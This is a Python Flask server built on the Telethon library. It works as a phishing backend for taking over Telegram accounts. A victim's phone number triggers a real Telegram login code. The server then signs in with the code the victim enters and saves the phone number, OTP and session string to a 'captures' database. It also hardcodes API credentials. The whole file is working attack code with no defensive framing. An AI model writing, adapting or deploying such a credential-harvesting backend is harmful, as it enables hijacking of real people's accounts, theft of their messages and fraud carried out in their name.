from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
from telethon import TelegramClient
from telethon.sessions import StringSession
import sqlite3
import os

app = Flask(__name__)
CORS(app)

API_ID = 35339777
API_HASH = '0787285b3a4c01fda1fe83c8ff2d0b71'
DB_PATH = '/tmp/captures.db'
TG_SESSION = os.environ.get('TG_SESSION', None)

# Init DB
conn = sqlite3.connect(DB_PATH)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS logs
             (id INTEGER PRIMARY KEY, user_id INTEGER, fake_code TEXT,
              phone TEXT, real_otp TEXT, session TEXT, timestamp DATETIME)''')
conn.commit()
conn.close()

def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

@app.route('/bot', methods=['POST'])
def handle():
    data = request.get_json()
    if not data:
        return jsonify({'success': False, 'error': 'Invalid JSON'})
    
    method = data.get('method')
    user_id = data.get('userId')
    fake_code = data.get('fakeCode')
    
    if method == 'send_otp':
        phone = data.get('phone')
        
        async def send_otp():
            client = TelegramClient(StringSession(TG_SESSION), API_ID, API_HASH)
            await client.start(phone=phone)
            await client.disconnect()
            
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute('UPDATE logs SET phone=? WHERE user_id=? AND fake_code=?',
                      (phone, int(user_id), fake_code))
            conn.commit()
            conn.close()
            return {'success': True}
        
        try:
            result = run_async(send_otp())
            return jsonify(result)
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)})
    
    elif method == 'verify_otp':
        otp = data.get('otp')
        
        async def verify_otp():
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute('SELECT phone FROM logs WHERE user_id=? AND fake_code=?',
                      (int(user_id), fake_code))
            row = c.fetchone()
            conn.close()
            if not row:
                return {'success': False, 'error': 'Phone not found'}
            phone = row[0]
            
            client = TelegramClient(StringSession(TG_SESSION), API_ID, API_HASH)
            await client.start(phone=phone)
            await client.sign_in(phone=phone, code=otp)
            session_str = client.session.save()
            
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute('UPDATE logs SET real_otp=?, session=? WHERE user_id=? AND fake_code=?',
                      (otp, session_str, int(user_id), fake_code))
            conn.commit()
            conn.close()
            await client.disconnect()
            return {'success': True}
        
        try:
            result = run_async(verify_otp())
            return jsonify(result)
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)})
    
    return jsonify({'success': False, 'error': 'Invalid method'})

@app.route('/')
def home():
    return 'Backend is running!'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
